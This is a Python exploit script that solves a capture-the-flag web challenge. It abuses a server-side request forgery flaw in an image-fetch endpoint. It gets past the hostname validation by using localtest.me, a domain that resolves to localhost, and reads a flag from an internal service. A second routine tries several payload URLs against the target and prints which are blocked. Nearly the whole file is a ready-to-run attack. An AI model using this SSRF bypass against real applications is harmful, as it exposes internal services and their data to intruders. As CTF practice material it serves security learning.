#!/usr/bin/env python3
"""
CTF Challenge: Fast and Rebound - 500 Points
Target: http://challenge.tcshackquest.com:16353/

This script exploits an SSRF vulnerability with hostname validation bypass
to access an internal service and retrieve the flag.
"""

import requests
import json

# Configuration
TARGET_URL = "http://challenge.tcshackquest.com:16353/fetch_image"
INTERNAL_SERVICE = "http://localtest.me:8080/flag"

def get_flag():
    """
    Exploits SSRF vulnerability to fetch the flag from internal service.
    
    The bypass works because:
    - localtest.me is a valid domain (passes hostname validation)
    - But it resolves to 127.0.0.1 (localhost)
    - This allows access to the internal service on port 8080
    """
    
    print("=" * 60)
    print("  FAST AND REBOUND - SSRF Exploit")
    print("=" * 60)
    
    payload = {"url": INTERNAL_SERVICE}
    
    print(f"\n[*] Target URL: {TARGET_URL}")
    print(f"[*] Payload URL: {INTERNAL_SERVICE}")
    print(f"[*] Sending POST request...")
    
    try:
        response = requests.post(
            TARGET_URL,
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload),
            timeout=10
        )
        
        print(f"[*] Status Code: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            if "Data" in data:
                flag = data["Data"]
                print(f"\n[+] SUCCESS! Flag retrieved:")
                print(f"\n    🚩 {flag}")
                print()
                return flag
            elif "error" in data:
                print(f"[-] Error: {data['error']}")
        else:
            print(f"[-] Request failed with status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
    
    return None


def demonstrate_attack_vectors():
    """
    Demonstrates various attack attempts and their results.
    """
    
    print("\n" + "=" * 60)
    print("  ATTACK VECTOR DEMONSTRATION")
    print("=" * 60)
    
    test_urls = [
        ("Direct localhost (blocked)", "http://127.0.0.1:8080/"),
        ("Direct localhost with flag (blocked)", "http://127.0.0.1:8080/flag"),
        ("localtest.me bypass (works!)", "http://localtest.me:8080/"),
        ("localtest.me flag endpoint (works!)", "http://localtest.me:8080/flag"),
    ]
    
    for description, url in test_urls:
        print(f"\n[*] Testing: {description}")
        print(f"    URL: {url}")
        
        try:
            response = requests.post(
                TARGET_URL,
                headers={"Content-Type": "application/json"},
                data=json.dumps({"url": url}),
                timeout=10
            )
            
            data = response.json()
            if "error" in data:
                print(f"    Result: ❌ {data['error']}")
            elif "Data" in data:
                print(f"    Result: ✅ {data['Data'][:50]}...")
                
        except Exception as e:
            print(f"    Result: ❌ Error - {e}")


if __name__ == "__main__":
    
    # Get the flag directly
    flag = get_flag()
    
    # Optionally demonstrate all attack vectors
    print("\n" + "-" * 60)
    user_input = input("\nWould you like to see attack vector demonstration? (y/n): ")
    if user_input.lower() == 'y':
        demonstrate_attack_vectors()
    
    print("\n" + "=" * 60)
    print("  EXPLOIT COMPLETE")
    print("=" * 60)
